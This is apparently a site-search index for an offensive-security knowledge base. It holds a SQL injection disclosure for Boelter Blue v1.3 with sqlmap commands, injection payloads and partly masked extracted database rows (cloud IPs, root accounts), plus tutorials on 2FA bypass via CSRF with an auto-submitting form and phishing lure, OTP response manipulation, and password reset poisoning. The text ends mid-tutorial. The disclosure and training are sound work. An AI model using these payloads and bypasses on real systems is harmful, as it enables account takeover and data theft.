{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83d\ude80 Welcome to CyberDepot \u2014 Your Ultimate Cybersecurity Resource","text":"<p>Welcome to CyberDepot, a meticulously curated knowledge base designed for cybersecurity professionals, ethical hackers, and penetration testers. Whether you're looking for payloads, reconnaissance tools, authentication bypass techniques, or HTB write-ups*, CyberDepot is your go-to repository for offensive security techniques.</p>"},{"location":"#explore-our-knowledge-base","title":"\ud83d\udd0d Explore Our Knowledge Base","text":""},{"location":"#payloads-exploits","title":"\ud83d\udee0\ufe0f Payloads &amp; Exploits","text":"<ul> <li>Web Exploits: XSS Attacks, SQL Injection, CSRF Exploits.</li> <li>Credential Attacks: Password Cracking, Credential Stuffing.</li> <li>Network Exploits: Botnets, Reverse Shells.</li> <li>Search Engine Hacking: Google Dorks.</li> </ul>"},{"location":"#reconnaissance-osint","title":"\ud83d\udd0e Reconnaissance &amp; OSINT","text":"<ul> <li>Tools: Shodan, Nmap.</li> <li>Cheatsheets: Quick references for reconnaissance techniques.</li> </ul>"},{"location":"#authentication-bypass","title":"\ud83d\udd13 Authentication Bypass","text":"<ul> <li>OTP Bypass Techniques: Exploiting weak multi-factor authentication.</li> <li>Password Reset Poisoning: Hijacking password recovery mechanisms.</li> <li>2FA Bypass via CSRF: Exploiting web authentication flaws.</li> </ul>"},{"location":"#vulnerability-disclosures","title":"\ud83d\udce2 Vulnerability Disclosures","text":"<ul> <li>Reports on discovered vulnerabilities, including Boelter Blue System Management v1.3.</li> </ul>"},{"location":"#wifi-hacking","title":"\ud83d\udce1 WiFi Hacking","text":"<ul> <li>WiFi Exploits: Techniques for network penetration testing.</li> </ul>"},{"location":"#hack-the-box-htb-write-ups","title":"\ud83c\udfc6 Hack The Box (HTB) Write-ups","text":"<ul> <li>Starting Point Machines: Beginner-friendly HTB walkthroughs.</li> <li>Retired Machines: Step-by-step solutions for past HTB challenges.</li> </ul> <p>\ud83c\udf10 CyberDepot is a community-driven repository. We welcome contributions from cybersecurity researchers worldwide. Together, we can advance knowledge and strengthen digital security.</p>"},{"location":"vuln_boelter_blue/","title":"Multiple SQL Injection Vulnerabilities in Boelter Blue System Management v1.3","text":"<p>Discovered by: [CBKB] - DeadlyData, R4d1x Date: 2024-05-27 Affected Software: Boelter Blue System Management  CVE: CVE-2024-36840 Version: 1.3 Google Dork: \"Powered by Boelter Blue\" Vendor: Boelter Blue (boelter.com) Software Link: Google Play Store Tested on: Linux Debian 9 (stretch), Apache 2.4.25, MySQL &gt;= 5.0.12  </p>"},{"location":"vuln_boelter_blue/#overview","title":"Overview","text":"<p>Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.</p>"},{"location":"vuln_boelter_blue/#affected-component","title":"Affected Component","text":"<p>news_details.php services.php location_details.php</p> <ul> <li>id parameter</li> <li>section parameter</li> </ul>"},{"location":"vuln_boelter_blue/#poc-example","title":"PoC Example","text":"<p>SQLMap Injection:  <code>sqlmap -u \"https://www.example.com/news_details.php?id=10071\" --random-agent --dbms=mysql --dbs</code></p> <p>news_details.php?id parameter: <code>sqlmap -u \"https://www.example.com/news_details.php?id=10071\" --random-agent --dbms=mysql --threads=4 --dbs</code></p> <p>services.php?section parameter: <code>sqlmap -u \"https://www.example.com/services.php?section=5081\" --random-agent --tamper=space2comment --threads=8 --dbs</code></p> <p>location_details.php?id parameter: <code>sqlmap -u \"https://www.example.com/location_details.php?id=836\" --random-agent --dbms=mysql --dbs</code></p>"},{"location":"vuln_boelter_blue/#injection-types","title":"Injection Types:","text":"<pre><code>Boolean-based blind\nParameter: id (GET)\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: id=10071 AND 1452=1452\n\n\nTime-based blind\nParameter: id (GET)\nType: time-based blind\nTitle: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\nPayload: id=10071 AND (SELECT 5588 FROM (SELECT(SLEEP(5)))UtkO)\n\nUnion-based injection\nParameter: id (GET)\nType: UNION query\nTitle: Generic UNION query (NULL) - 8 columns\nPayload: id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- -\n</code></pre>"},{"location":"vuln_boelter_blue/#http-requests","title":"HTTP Requests:","text":"<pre><code>Boolean-based blind\n\n    GET /news_details.php?id=10071 AND 1452=1452 HTTP/1.1\n    Host: [target_website]\n    User-Agent: [Your User-Agent]\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection: keep-alive\n    Upgrade-Insecure-Requests: 1\n\n\nTime-based blind\n\n    GET /news_details.php?id=10071 AND (SELECT 5588 FROM (SELECT(SLEEP(5)))UtkO) HTTP/1.1\n    Host: [target_website]\n    User-Agent: [Your User-Agent]\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection: keep-alive\n    Upgrade-Insecure-Requests: 1\n\n\nUnion-based injection\n\n    GET /news_details.php?id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1\n    Host: [target_website]\n    User-Agent: [Your User-Agent]\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection: keep-alive\n    Upgrade-Insecure-Requests: 1\n</code></pre>"},{"location":"vuln_boelter_blue/#impact","title":"Impact","text":"<p>These vulnerabilities can be exploited to achieve the following:</p> <ul> <li>Data Exfiltration: Admin credentials, user email/password hashes, device hashes, user PII, purchase history, and database credentials.</li> <li>Remote Code Execution: Through execution of arbitrary SQL queries.</li> <li>Account Takeover: By retrieving and decrypting user credentials.</li> <li>Full Database Access: Ability to read, modify, and delete any data in the database.</li> </ul>"},{"location":"vuln_boelter_blue/#technical-details","title":"Technical Details","text":""},{"location":"vuln_boelter_blue/#database-information","title":"Database Information","text":"<p>DBMS: MySQL &gt;= 5.0.12 Web Server: Apache 2.4.25 Operating System: Linux Debian 9 (stretch)</p>"},{"location":"vuln_boelter_blue/#extracted-databases","title":"Extracted Databases","text":"<pre><code>available databases [5]:\n[*] Anchor5Digital\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] sys\n</code></pre>"},{"location":"vuln_boelter_blue/#sample-extracted-data","title":"Sample Extracted Data","text":"<p>Database: Anchor5Digital</p> <p>Table: DatabaseConnection</p> <pre><code>+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+\n| id | ip              | url                                                    | name          | mainURL                            | username | password   | displayName    |\n+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+\n| 1  | 104.197.215.116 | /cloudsql/patrick-cudahy:us-central1:patrick-cudahy-db | PatrickCudahy | https://patrick-cudahy.appspot.com | root     | S0lu****   | Patrick cuda** |\n| 2  | 35.184.62.89    | /cloudsql/our-event-app:us-central1:oureventapp-db     | OurEventApp   | https://our-event-app.appspot.com  | root     | S0lu****   | OurEventApp    |\n+----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+\n</code></pre> <p>Table: Payment</p> <pre><code>+----------------+-------------+\n| Column         | Type        |\n+----------------+-------------+\n| type           | varchar(20) |\n| amount         | varchar(20) |\n| auth_code      | varchar(50) |\n| business_id    | int(11)     |\n| id             | int(11)     |\n| paymentDate    | varchar(50) |\n| people_id      | int(11)     |\n| processor      | varchar(20) |\n| transaction_id | varchar(30) |\n+----------------+-------------+\n</code></pre> <p>Table: system_user</p> <pre><code>+-----------+\n| Host      |\n+-----------+\n| %         |\n| 127.0.0.1 |\n| 127.0.0.1 |\n| ::1       |\n| localhost |\n| localhost |\n| localhost |\n| localhost |\n+-----------+\n\n+-----------------+\n| User            |\n+-----------------+\n| cloudsqlexport  |\n| cloudsqlimport  |\n| cloudsqlimport  |\n| cloudsqloneshot |\n| cloudsqlreplica |\n| root            |\n| root            |\n| root            |\n+-----------------+\n</code></pre>"},{"location":"vuln_boelter_blue/#mitigation","title":"Mitigation","text":"<p>To mitigate these vulnerabilities, it is recommended to:</p> <ul> <li>Validate and Sanitize User Inputs: Ensure that all user-supplied data is properly validated and sanitized before being processed by the application.</li> <li>Use Parameterized Queries: Implement parameterized queries or prepared statements to prevent SQL injection.</li> <li>Implement a WAF: Deploy a Web Application Firewall to detect and block SQL injection attempts.</li> </ul>"},{"location":"vuln_boelter_blue/#references","title":"References","text":"<ul> <li>Boelter Blue Homepage</li> <li>Google Play Store</li> <li>CVE - MITRE</li> </ul>"},{"location":"vuln_boelter_blue/#disclosure-timeline","title":"Disclosure Timeline","text":"<ul> <li>2023: Vulnerabilities discovered by CBKB team.</li> <li>2023: Vendor notified.</li> <li>2024: Vendor notified.</li> <li>2024-05-27: Public disclosure and CVE request submitted.</li> <li>2024-06-4: RESERVED CVE By mitre</li> <li>2024-06-4: Exploit disclosed to exploit-db</li> <li>2024-06-4: Exploit disclosed to packetstorm</li> </ul>"},{"location":"vuln_boelter_blue/#cve-information","title":"CVE Information","text":"<ul> <li>CVE ID: CVE-2024-36840</li> </ul>"},{"location":"vuln_boelter_blue/#contact-information","title":"Contact Information","text":"<p>For any questions or concerns regarding this vulnerability, please contact us at: infosecdb@protonmail.com</p> <p>[CBKB]-   DeadlyData,  [CBKB]-   R4d1x</p>"},{"location":"auth_bypass/2fa_bypass_via_csrf/","title":"Advanced 2FA Bypass via CSRF: Exploiting Two-Factor Authentication Vulnerabilities","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#overview","title":"Overview","text":"<p>This tutorial demonstrates how to exploit vulnerabilities in the two-factor authentication (2FA) process using Cross-Site Request Forgery (CSRF). By manipulating 2FA requests, an attacker can potentially bypass 2FA and gain unauthorized access to a user\u2019s account. This guide is intended for educational purposes to enhance your penetration testing skills as part of OSCP training.</p>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#step-by-step-guide","title":"Step-by-Step Guide","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#1-setting-up-the-environment","title":"1. Setting Up the Environment","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#prerequisites","title":"Prerequisites","text":"<ul> <li>A vulnerable web application with 2FA and CSRF vulnerabilities.</li> <li>BurpSuite installed and configured to intercept HTTP/HTTPS traffic.</li> <li>An account on the target web application with 2FA enabled.</li> </ul>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#configuring-burpsuite","title":"Configuring BurpSuite","text":"<ol> <li> <p>Open BurpSuite:</p> <ul> <li>Launch BurpSuite and navigate to the \"Proxy\" tab.</li> <li>Click on \"Intercept\" to ensure it is turned on.</li> <li> <p>Set Up Your Browser:</p> </li> <li> <p>Open your browser settings and configure the proxy settings to use <code>127.0.0.1</code> and port <code>8080</code> (default BurpSuite settings).</p> </li> <li>Ensure you have installed BurpSuite's CA certificate in your browser to avoid SSL/TLS issues. This can be done by going to BurpSuite's \"Proxy\" &gt; \"Options\" &gt; \"Import / Export CA Certificate\".</li> </ul> </li> </ol>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#2-understanding-csrf-and-2fa","title":"2. Understanding CSRF and 2FA","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#cross-site-request-forgery-csrf","title":"Cross-Site Request Forgery (CSRF)","text":"<p>CSRF is an attack that forces a user to execute unwanted actions on a web application where they are authenticated. By exploiting the trust that a web application has in the user\u2019s browser, an attacker can trick the user into submitting requests unknowingly.</p>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#two-factor-authentication-2fa","title":"Two-Factor Authentication (2FA)","text":"<p>2FA adds an additional layer of security by requiring a second form of authentication (e.g., a code sent to a mobile device) in addition to the user\u2019s password.</p>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#3-identifying-the-vulnerability","title":"3. Identifying the Vulnerability","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#analyze-the-2fa-implementation","title":"Analyze the 2FA Implementation","text":"<ol> <li> <p>Log in to the Target Web Application:</p> <ul> <li>Enter your username and password to log in.</li> <li>You will be prompted to enter a 2FA code.</li> <li> <p>Capture the 2FA Request in BurpSuite:</p> </li> <li> <p>Ensure interception is turned on in BurpSuite.</p> </li> <li>Enter the 2FA code and submit the form.</li> <li> <p>BurpSuite will capture the HTTP request. For example:</p> <p>`POST /verify_2fa HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 40</p> <p>code=123456&amp;session=abcdef123456` </p> </li> </ul> </li> <li> <p>Analyze the Request:</p> <ul> <li>Examine the request parameters. Look for the 2FA code and session identifiers.</li> </ul> </li> </ol>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#4-crafting-the-csrf-attack","title":"4. Crafting the CSRF Attack","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#create-a-malicious-html-form","title":"Create a Malicious HTML Form","text":"<ol> <li> <p>Craft the CSRF Payload:</p> <ul> <li> <p>Create an HTML file with a form that mimics the 2FA request. For example:</p> <p><code>&lt;html&gt; &lt;body&gt;   &lt;form action=\"http://example.com/verify_2fa\" method=\"POST\"&gt;     &lt;input type=\"hidden\" name=\"code\" value=\"123456\"&gt;     &lt;input type=\"hidden\" name=\"session\" value=\"abcdef123456\"&gt;     &lt;input type=\"submit\" value=\"Submit request\"&gt;   &lt;/form&gt;   &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code> </p> </li> </ul> </li> <li> <p>Host the HTML File:</p> <ul> <li>Host this HTML file on a server controlled by the attacker or use a local web server.</li> </ul> </li> </ol>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#example-of-hosting-the-payload","title":"Example of Hosting the Payload","text":"<p>You can use a simple Python HTTP server to host the HTML file:</p> <p><code>$ cd /path/to/html/file $ python3 -m http.server 8080</code> </p>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#5-exploiting-the-csrf-vulnerability","title":"5. Exploiting the CSRF Vulnerability","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#deliver-the-payload","title":"Deliver the Payload","text":"<ol> <li> <p>Send the Link to the Victim:</p> <ul> <li> <p>Trick the victim into visiting the malicious HTML file. This can be done via email, social engineering, or other means. For example:</p> <p><code>Hi, Please review the attached document by clicking the link below: http://attacker-server:8080</code> </p> </li> </ul> </li> <li> <p>Victim Executes the CSRF Payload:</p> <ul> <li>When the victim opens the link, the form is submitted automatically, sending the 2FA code and session information to the target web application.</li> </ul> </li> </ol>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#6-bypassing-2fa-and-gaining-access","title":"6. Bypassing 2FA and Gaining Access","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#verify-the-attack","title":"Verify the Attack","text":"<ol> <li> <p>Check if the 2FA Was Bypassed:</p> <ul> <li>If successful, the attack will bypass the 2FA check, and the attacker will gain access to the user\u2019s account.</li> <li> <p>Log in as the Victim:</p> </li> <li> <p>Use the victim's session information or credentials to log in to the account without needing the 2FA code.</p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#additional-examples-and-advanced-techniques","title":"Additional Examples and Advanced Techniques","text":""},{"location":"auth_bypass/2fa_bypass_via_csrf/#example-using-burpsuite-to-automate-the-attack","title":"Example: Using BurpSuite to Automate the Attack","text":"<ul> <li>Use BurpSuite's Intruder tool to automate the attack by sending multiple requests with different 2FA codes:<ol> <li>Intercept the 2FA request.</li> <li>Send the request to Intruder by right-clicking on the request and selecting \"Send to Intruder\".</li> <li>Set the payload position for the <code>code</code> parameter.</li> <li>Configure the payload set with possible 2FA codes (e.g., 000000 to 999999).</li> <li>Start the attack and analyze the responses to identify valid 2FA codes.</li> </ol> </li> </ul>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#example-understanding-and-manipulating-session-identifiers","title":"Example: Understanding and Manipulating Session Identifiers","text":"<ul> <li>Examine how session identifiers are used in the 2FA process:<ol> <li>Capture a valid session identifier when logging in and during 2FA.</li> <li>Manipulate the session identifier in the CSRF payload to see if the application accepts the modified session.</li> </ol> </li> </ul>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#example-exploiting-weak-2fa-implementations","title":"Example: Exploiting Weak 2FA Implementations","text":"<ul> <li>Identify and exploit weak 2FA implementations:<ol> <li>Test common default 2FA codes (e.g., 123456, 000000).</li> <li>Check for predictable 2FA codes based on time or user patterns.</li> </ol> </li> </ul>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#mitigation-strategies","title":"Mitigation Strategies","text":"<p>To prevent 2FA bypass attacks via CSRF, consider implementing the following security measures:</p> <ol> <li> <p>Use Anti-CSRF Tokens:</p> <ul> <li>Include unique, unpredictable tokens in all sensitive requests to prevent CSRF attacks.</li> <li> <p>Secure Cookie Attributes:</p> </li> <li> <p>Set the <code>HttpOnly</code> and <code>Secure</code> flags on cookies to prevent them from being accessed via JavaScript and ensure they are only sent over HTTPS.</p> </li> <li> <p>Implement SameSite Cookies:</p> </li> <li> <p>Use the <code>SameSite</code> attribute for cookies to control how cookies are sent with cross-site requests.</p> </li> <li> <p>Rate Limiting:</p> </li> <li> <p>Implement rate limiting on 2FA verification attempts to prevent brute force attacks.</p> </li> <li> <p>Monitor and Log 2FA Attempts:</p> </li> <li> <p>Monitor and log all 2FA attempts and alert administrators of suspicious activity.</p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#response-manipulation","title":"Response Manipulation","text":"<pre><code>In response if \"success\":false\nChange it to \"success\":true\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#status-code-manipulation","title":"Status Code Manipulation","text":"<pre><code>If Status Code is 4xx\nTry to change it to 200 OK and see if it bypass restrictions\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#2fa-code-leakage-in-response","title":"2FA Code Leakage in Response","text":"<pre><code>Check the response of the 2FA Code Triggering Request to see if the code is leaked.\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#js-file-analysis","title":"JS File Analysis","text":"<pre><code>Rare but some JS Files may contain info about the 2FA Code, worth giving a shot\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#2fa-code-reusability","title":"2FA Code Reusability","text":"<pre><code>Same code can be reused\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#lack-of-brute-force-protection","title":"Lack of Brute-Force Protection","text":"<pre><code>Possible to brute-force any length 2FA Code\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#missing-2fa-code-integrity-validation","title":"Missing 2FA Code Integrity Validation","text":"<pre><code>Code for any user acc can be used to bypass the 2FA\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#csrf-on-2fa-disabling","title":"CSRF on 2FA Disabling","text":"<pre><code>No CSRF Protection on disabling 2FA, also there is no auth confirmation\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#password-reset-disable-2fa","title":"Password Reset Disable 2FA","text":"<pre><code>2FA gets disabled on password change/email change\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#backup-code-abuse","title":"Backup Code Abuse","text":"<pre><code>Bypassing 2FA by abusing the Backup code feature\nUse the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#clickjacking-on-2fa-disabling-page","title":"Clickjacking on 2FA Disabling Page","text":"<pre><code>Iframing the 2FA Disabling page and social engineering victim to disable the 2FA\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#enabling-2fa-doesnt-expire-previously-active-sessions","title":"Enabling 2FA doesn't expire Previously active Sessions","text":"<pre><code>If the session is already hijacked and there is a session timeout vuln\n</code></pre>"},{"location":"auth_bypass/2fa_bypass_via_csrf/#bypass-2fa-with-null-or-000000","title":"Bypass 2FA with null or 000000","text":"<pre><code>Enter the code 000000 or null to bypass 2FA protection.\n</code></pre>"},{"location":"auth_bypass/otp_bypass/","title":"OTP Bypass Techniques","text":""},{"location":"auth_bypass/otp_bypass/#otp-bypass-on-account-registration-via-response-manipulation","title":"OTP Bypass on Account Registration via Response Manipulation","text":""},{"location":"auth_bypass/otp_bypass/#overview","title":"Overview","text":"<p>This article demonstrates several methods to bypass OTP (One-Time Password) verification during account registration or login processes using BurpSuite. These techniques can potentially lead to unauthorized access to user accounts, resulting in account takeover. This guide is intended for educational purposes to help you understand common vulnerabilities and improve your skills in penetration testing.</p>"},{"location":"auth_bypass/otp_bypass/#method-1-response-manipulation-during-registration","title":"Method 1: Response Manipulation During Registration","text":"<ol> <li>Register an Account:<ul> <li>Register an account with a mobile number and request an OTP.</li> </ul> </li> <li>Capture the Request:<ul> <li>Enter an incorrect OTP and capture the request in BurpSuite.</li> </ul> </li> <li> <p>Intercept the Response:</p> <ul> <li>In BurpSuite, go to the \"Proxy\" tab and intercept the response to the OTP verification request.</li> <li>The response will look like:</li> </ul> <p><code>{\"verificationStatus\":false,\"mobile\":\"9072346577\",\"profileId\":\"84673832\"}</code> </p> </li> <li> <p>Modify the Response:</p> <ul> <li>Change the response to:</li> </ul> <p><code>{\"verificationStatus\":true,\"mobile\":\"9072346577\",\"profileId\":\"84673832\"}</code> </p> <ul> <li>In BurpSuite, edit the intercepted response directly in the \"HTTP history\" tab.</li> <li>Forward the Response:</li> <li>Forward the modified response by clicking on the \"Forward\" button.</li> <li>Outcome:</li> <li>You will be logged into the account.</li> </ul> </li> </ol> <p>Impact: Account Takeover</p>"},{"location":"auth_bypass/otp_bypass/#method-2-response-manipulation-during-login","title":"Method 2: Response Manipulation During Login","text":"<ol> <li>Initiate Login:<ul> <li>Go to the login page and request an OTP.</li> </ul> </li> <li>Capture the Request:<ul> <li>Enter an incorrect OTP and capture the request in BurpSuite.</li> </ul> </li> <li>Intercept the Response:<ul> <li>In BurpSuite, intercept the response to the OTP verification request.</li> <li>The response will indicate an error (e.g., incorrect OTP).</li> </ul> </li> <li>Modify the Response:<ul> <li>Change the response to indicate success (e.g., replace <code>{\"status\":\"error\"}</code> with <code>{\"status\":\"success\"}</code>).</li> </ul> </li> <li>Forward the Response:<ul> <li>Forward the modified response by clicking on the \"Forward\" button.</li> </ul> </li> <li>Outcome:<ul> <li>You will be logged into the account.</li> </ul> </li> </ol> <p>Impact: Account Takeover</p>"},{"location":"auth_bypass/otp_bypass/#method-3-intercept-and-modify-response-status","title":"Method 3: Intercept and Modify Response Status","text":"<ol> <li>Register Two Accounts:<ul> <li>Register two accounts with any two mobile numbers, entering the correct OTP initially.</li> </ul> </li> <li>Capture the Request:<ul> <li>Intercept your request in BurpSuite.</li> </ul> </li> <li>Intercept the Response:<ul> <li>Click on \"Action\" -&gt; \"Do intercept\" -&gt; \"Intercept response to this request\".</li> </ul> </li> <li>Check the Response:<ul> <li>Check the response message for a status, e.g., <code>status:1</code>.</li> </ul> </li> <li>Repeat with Incorrect OTP:<ul> <li>Follow the same procedure with the other account but enter an incorrect OTP this time.</li> </ul> </li> <li>Capture and Modify:<ul> <li>Intercept the response to the request and note the message status, e.g., <code>status:0</code>.</li> <li>Change the status to <code>status:1</code>.</li> </ul> </li> <li>Forward the Response:<ul> <li>Forward the modified response by clicking on the \"Forward\" button.</li> </ul> </li> <li>Outcome:<ul> <li>If you are logged in, you have successfully bypassed authentication.</li> </ul> </li> </ol>"},{"location":"auth_bypass/otp_bypass/#method-4-bypass-otp-in-registration-forms-using-repeater","title":"Method 4: Bypass OTP in Registration Forms Using Repeater","text":"<ol> <li>Create an Account:<ul> <li>Create an account with a non-existent phone number.</li> </ul> </li> <li>Intercept the Request:<ul> <li>Intercept the request in BurpSuite.</li> </ul> </li> <li>Use Repeater:<ul> <li>Send the request to the repeater by right-clicking on the request and selecting \"Send to Repeater\".</li> </ul> </li> <li>Modify the Phone Number:<ul> <li>Go to the Repeater tab and change the non-existent phone number to your phone number.</li> </ul> </li> <li>Use Received OTP:<ul> <li>If you receive an OTP on your phone, use that OTP to register the non-existent number.</li> </ul> </li> </ol>"},{"location":"auth_bypass/otp_bypass/#method-5-no-rate-limiting","title":"Method 5: No Rate Limiting","text":"<ol> <li>Create an Account:<ul> <li>Create an account.</li> </ul> </li> <li>Capture the Request:<ul> <li>When the application asks for the OTP, enter an incorrect OTP and capture the request in BurpSuite.</li> </ul> </li> <li>Use Repeater:<ul> <li>Send this request to the Repeater by right-clicking on the request and selecting \"Send to Repeater\".</li> </ul> </li> <li>Check for Rate Limiting:<ul> <li>Set up a payload on the OTP value and repeat the request.</li> <li>If there is no rate limit, wait for a 200 OK or 302 Found status code.</li> </ul> </li> <li>Outcome:<ul> <li>If you receive a 200 OK or 302 Found status code, you have bypassed the OTP.</li> </ul> </li> </ol>"},{"location":"auth_bypass/otp_bypass/#additional-test-cases-for-bypassing-otp","title":"Additional Test Cases for Bypassing OTP","text":"<ol> <li>Default OTPs:<ul> <li>Test common default OTPs like <code>111111</code>, <code>123456</code>, <code>000000</code>.</li> </ul> </li> <li>Leaked OTP in Response:<ul> <li>Capture the request in BurpSuite and check the response for any leaked OTP.</li> </ul> </li> <li>Old OTP Validity:<ul> <li>Check if an old OTP is still valid by attempting to reuse it.</li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/","title":"Password Reset Poisoning: Intercepting and Manipulating Email Links","text":""},{"location":"auth_bypass/password_reset_poisoning/#overview","title":"Overview","text":"<p>This tutorial demonstrates how to exploit vulnerabilities in the password reset process by intercepting and manipulating email links using BurpSuite. This can allow an attacker to reset a user\u2019s password and gain unauthorized access to their account. This guide is intended for educational purposes to enhance your penetration testing skills as part of OSCP training.</p>"},{"location":"auth_bypass/password_reset_poisoning/#step-by-step-guide","title":"Step-by-Step Guide","text":""},{"location":"auth_bypass/password_reset_poisoning/#1-setting-up-the-environment","title":"1. Setting Up the Environment","text":""},{"location":"auth_bypass/password_reset_poisoning/#prerequisites","title":"Prerequisites","text":"<ul> <li>A vulnerable web application with a password reset feature.</li> <li>BurpSuite installed and configured to intercept HTTP/HTTPS traffic.</li> <li>An email client to receive password reset emails.</li> </ul>"},{"location":"auth_bypass/password_reset_poisoning/#configuring-burpsuite","title":"Configuring BurpSuite","text":"<ol> <li> <p>Open BurpSuite:</p> <ul> <li>Launch BurpSuite and navigate to the \"Proxy\" tab.</li> <li>Click on \"Intercept\" to ensure it is turned on.</li> <li> <p>Set Up Your Browser:</p> </li> <li> <p>Open your browser settings and configure the proxy settings to use <code>127.0.0.1</code> and port <code>8080</code> (default BurpSuite settings).</p> </li> <li>Ensure you have installed BurpSuite's CA certificate in your browser to avoid SSL/TLS issues. This can be done by going to BurpSuite's \"Proxy\" &gt; \"Options\" &gt; \"Import / Export CA Certificate\".</li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#2-initiating-the-password-reset-process","title":"2. Initiating the Password Reset Process","text":""},{"location":"auth_bypass/password_reset_poisoning/#trigger-password-reset","title":"Trigger Password Reset","text":"<ol> <li> <p>Navigate to the Target Web Application's Password Reset Page:</p> <ul> <li>Locate the \"Forgot Password\" or equivalent link on the login page.</li> <li> <p>Enter the Email Address:</p> </li> <li> <p>Use the email address of the account you want to reset the password for.</p> </li> <li> <p>Submit the Form:</p> </li> <li> <p>Click on the \"Reset Password\" or equivalent button to submit the request.</p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#capture-the-request","title":"Capture the Request","text":"<ol> <li> <p>Intercept the Request in BurpSuite:</p> <ul> <li>Ensure interception is turned on in BurpSuite. When you submit the form, BurpSuite will capture the HTTP request.</li> <li> <p>Analyze the Request:</p> </li> <li> <p>Examine the request headers and parameters to understand how the password reset process works. For example:</p> </li> </ul> <p>`POST /reset_password HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 40</p> <p>email=user@example.com&amp;action=reset` </p> <ul> <li>Look for parameters like <code>email</code> or <code>user_id</code>.</li> <li> <p>Forward the Request:</p> </li> <li> <p>Forward the request to allow the email to be sent to the target's email address.</p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#3-intercepting-the-password-reset-email","title":"3. Intercepting the Password Reset Email","text":""},{"location":"auth_bypass/password_reset_poisoning/#receive-the-email","title":"Receive the Email","text":"<ol> <li>Check the Email Account:<ul> <li>Log in to the email account used for the password reset request.</li> <li> <p>Look for the password reset email. It typically contains a link or token for resetting the password, such as:</p> <p><code>https://example.com/reset_password?token=abcd1234</code> </p> </li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#capture-the-reset-link","title":"Capture the Reset Link","text":"<ol> <li>Copy the Reset Link:<ul> <li>Copy the URL or token provided in the email.</li> </ul> </li> </ol>"},{"location":"auth_bypass/password_reset_poisoning/#4-intercepting-and-modifying-the-reset-link-request","title":"4. Intercepting and Modifying the Reset Link Request","text":""},{"location":"auth_bypass/password_reset_poisoning/#prepare-to-intercept-the-reset-link-request","title":"Prepare to Intercept the Reset Link Request","text":"<ol> <li> <p>Paste the Reset Link into Your Browser:</p> <ul> <li>Paste the copied URL into your browser but do not press Enter yet.</li> <li> <p>Turn On Interception in BurpSuite:</p> </li> <li> <p>Ensure BurpSuite's 